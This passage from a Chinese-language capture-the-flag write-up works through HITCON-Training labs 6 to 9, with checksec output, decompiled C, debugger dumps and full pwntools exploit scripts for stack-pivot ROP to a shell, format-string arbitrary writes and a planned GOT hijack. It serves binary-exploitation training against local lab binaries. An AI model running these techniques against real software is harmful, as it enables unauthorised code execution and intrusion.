class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\">0x08048000 0x08049000 0x00000000 r-x /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x08049000 0x0804a000 0x00000000 r-- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rw- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0xf7dfe000 0xf7dff000 0x00000000 rw- </span><br><span class=\"line\">0xf7dff000 0xf7faf000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7faf000 0xf7fb1000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb1000 0xf7fb2000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb2000 0xf7fb5000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd3000 0xf7fd4000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class=\"line\">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class=\"line\">0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xfffdd000 0xffffe000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"1-将fake-frame写到RW段\"><a href=\"#1-将fake-frame写到RW段\" class=\"headerlink\" title=\"1.将fake_frame写到RW段\"></a>1.将fake_frame写到RW段</h4><p>执行两次leave ret跳转到rwadddr</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-leak-libc\"><a href=\"#2-leak-libc\" class=\"headerlink\" title=\"2.leak libc\"></a>2.leak libc</h4><p>执行两次leave ret跳转到rwaddr+0x100</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># adjust stack to next part chain of rop</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># call read</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"3-RCE\"><a href=\"#3-RCE\" class=\"headerlink\" title=\"3.RCE\"></a>3.RCE</h4><p>rwaddr+0x100处直接getshell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x28</span></span><br><span class=\"line\">popebp = <span class=\"number\">0x0804856b</span></span><br><span class=\"line\">ret = <span class=\"number\">0x08048356</span></span><br><span class=\"line\">leaveret = <span class=\"number\">0x08048418</span></span><br><span class=\"line\">rwaddr = <span class=\"number\">0x0804b000</span><span class=\"number\">-0x300</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0804836d : pop ebx ; ret</span></span><br><span class=\"line\">pop1 = <span class=\"number\">0x0804836d</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\" :\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\"># arg3</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">rop = p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># retn addr of puts_plt</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>])</span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># after pop 1</span></span><br><span class=\"line\">rop += p32(leaveret)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvline()[:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab7——Crack\"><a href=\"#Lab7——Crack\" class=\"headerlink\" title=\"Lab7——Crack\"></a>Lab7——Crack</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开了canary，栈利用应该比较困难。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab7$ checksec crack</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是典型的格式化字符串利用，将bss段的全局变量passwprd覆盖为已知值即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd; <span class=\"comment\">// ST14_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [esp+8h] [ebp-80h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+18h] [ebp-70h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+7Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v3 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">  srand(v3);</span><br><span class=\"line\">  fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  read(fd, &amp;password, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"What your name ? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x63</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello ,\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(&amp;buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Your password :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">0xF</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( atoi(&amp;nptr) == password )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Congrt!!\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"cat /home/crack/flag\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Goodbyte\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>首先测得 or 调试得到格式化字符串在栈中的偏移为10，然后布置<code>target_addr%10$n</code>的格式化字符串，向target_addr写入4。然后输入4即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a048</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%10$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">\":\"</span>, <span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Congrt!!</span><br><span class=\"line\">cat: /home/crack/flag: No such file or directory</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab8——craxme\"><a href=\"#Lab8——craxme\" class=\"headerlink\" title=\"Lab8——craxme\"></a>Lab8——craxme</h2><h3 id=\"防护-6\"><a href=\"#防护-6\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab8$ checksec craxme</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>和Lab7相似，也是fmt的利用，分别向目标地址写入218和0xFACEB00C，前者直接写即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a038</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">218</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>后者需要有一定的构造。首先，由于是小端存储，要向内存中写4个byte的数据，只要用<code>$hhn</code>分别向单字节写即可。如要想写入0x12345678，相当于分别向target_addr ~ target_addr + 3的地址写入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x78</span><br><span class=\"line\">0x56</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x12</span><br></pre></td></tr></table></figure>\n<p>首先将地址放在栈中，然后计算应该padding多少个字节，最后用hhn写入。注意取余</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_addr = <span class=\"number\">0x804a038</span></span><br><span class=\"line\">target = <span class=\"number\">0xFACEB00C</span></span><br><span class=\"line\">payload = p32(target_addr) + p32(target_addr + <span class=\"number\">1</span>) + p32(target_addr + <span class=\"number\">2</span>) + p32(target_addr + <span class=\"number\">3</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0x0c</span> - len(payload)) % <span class=\"number\">256</span>) + <span class=\"string\">\"c%7$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xb0</span> - <span class=\"number\">0x0c</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%8$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xce</span> - <span class=\"number\">0xb0</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%9$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xfa</span> - <span class=\"number\">0xce</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%10$hhn\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab9——playfmt\"><a href=\"#Lab9——playfmt\" class=\"headerlink\" title=\"Lab9——playfmt\"></a>Lab9——playfmt</h2><h3 id=\"防护-7\"><a href=\"#防护-7\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab9$ checksec playfmt</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>也是格式化字符串的利用，每次向bss段上读入0xc8的格式化字符串，然后printf，当读入quit时，退出。</p>\n<p>显然，因为格式化字符串不在栈上，所以处理起来有些麻烦，首先可以看到相对偏移为15的位置有一个libc上的地址，将它leak出来获得libc基地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf0c│+0x0000: 0x08048540  →  &lt;do_fmt+69&gt; add esp, 0x10\t ← $esp</span><br><span class=\"line\">0xffffcf10│+0x0004: 0x0804a060  →  &quot;AAAA%p%p%p%p%p%p%p%p%p&quot;</span><br><span class=\"line\">0xffffcf14│+0x0008: 0x08048640  →  &quot;quit&quot;</span><br><span class=\"line\">0xffffcf18│+0x000c: 0x00000004</span><br><span class=\"line\">0xffffcf1c│+0x0010: 0x0804857c  →  &lt;play+51&gt; add esp, 0x10 </span><br><span class=\"line\">0xffffcf20│+0x0014: 0x08048645  →  &quot;=====================&quot;</span><br><span class=\"line\">0xffffcf24│+0x0018: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf28│+0x001c: 0xffffcf38  →  0xffffcf48  →  0x00000000\t ← $ebp &lt;= ebp1 7</span><br><span class=\"line\">0xffffcf2c│+0x0020: 0x08048584  →  &lt;play+59&gt; nop &lt;= 8</span><br><span class=\"line\">0xffffcf30│+0x0024: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf34│+0x0028: 0x00000000</span><br><span class=\"line\">0xffffcf38│+0x002c: 0xffffcf48  →  0x00000000 &lt;= ebp2 11</span><br><span class=\"line\">0xffffcf3c│+0x0030: 0x080485b1  →  &lt;main+42&gt; nop &lt;= 12</span><br><span class=\"line\">0xffffcf40│+0x0034: 0xf7fb13dc  →  0xf7fb21e0  →  0x00000000</span><br><span class=\"line\">0xffffcf44│+0x0038: 0xffffcf60  →  0x00000001</span><br><span class=\"line\">0xffffcf48│+0x003c: 0x00000000</span><br><span class=\"line\">0xffffcf4c│+0x0040: 0xf7e17637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br></pre></td></tr></table></figure>\n<p>但是，也因为fmt string不在栈上，想要任意地址写则比较困难，这里参考了Vidar-Team某师傅的题解（<a href=\"https://veritas501.space/2017/05/23/HITCON-training%20writeup/\" target=\"_blank\" rel=\"noopener\">https://veritas501.space/2017/05/23/HITCON-training%20writeup/</a>），利用栈中ebp的相对偏移已知的特点。我们可以看到0xffffcf28处ebp指向0xffffcf38处，而0xffffcf38处指向0xffffcf48处。</p>\n<p>这里有几个需要注意的点：</p>\n<ul>\n<li>首先我们需要leak栈地址，才能利用格式化字符串漏洞进行写入，通过”%6$x”将ebp1处存的ebp2的栈地址leak出来，然后根据相对偏移算出ebp1、nop1、nop2的地址。</li>\n<li>如果我们修改ebp1，就相当于向ebp2的地址写，再修改ebp2，也就相当于往任意地址写。</li>\n<li>注意到栈地址只有低2个字节不同，所以用hn写入低两个字节即可修改ebp1处和ebp2处的地址。</li>\n<li>我们想要劫持got表，将printf@got修改为system。由Lab8可以知道，想写入一个大整数，直接写4个byte是不行的，所以在这里我们分开写，两个byte两个byte的写：将nop1修改为printf@got的地址，将nop2修改为printf@got + 2的地址，然后用%c$hn写入即可。</li>\n</ul>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 